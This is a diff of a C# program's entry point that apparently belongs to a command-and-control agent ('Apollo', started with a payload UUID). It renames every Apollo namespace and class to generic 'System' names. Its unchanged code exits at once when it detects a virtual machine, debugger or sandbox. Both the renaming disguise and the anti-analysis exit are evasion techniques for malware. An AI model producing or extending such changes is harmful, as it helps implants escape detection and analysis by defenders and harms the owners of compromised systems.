@@ -1,23 +1,23 @@
 ﻿using System;
-using ApolloInterop.Serializers;
+using SystemInterop.Serializers;
 using System.Collections.Generic;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
+using SystemInterop.Classes;
+using SystemInterop.Interfaces;
 using System.IO.Pipes;
-using ApolloInterop.Structs.ApolloStructs;
+using SystemInterop.Structs.SystemStructs;
 using System.Text;
 using System.Threading;
 using System.Linq;
 using System.Collections.Concurrent;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Enums.ApolloEnums;
+using SystemInterop.Classes.Core;
+using SystemInterop.Classes.Events;
+using SystemInterop.Enums.SystemEnums;
 using System.Runtime.InteropServices;
 using System.Management;
 using System.Diagnostics;
 using Microsoft.Win32;
 
-namespace Apollo
+namespace System
 {
     class Program
     {
@@ -35,7 +35,7 @@ namespace Apollo
         private static Action<object> _flushMessages;
         public static void Main(string[] args)
         {
-            // Phantom Apollo Anti-Analysis System
+            // Phantom System Anti-Analysis System
             if (IsVirtualMachine() || IsDebuggerPresent() || IsSandboxEnvironment())
             {
                 Environment.Exit(0);
@@ -54,7 +54,7 @@ namespace Apollo
             }
 
             // This is main execution.
-            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
+            Agent.System ap = new Agent.System(Config.PayloadUUID);
             ap.Start();
         }
 
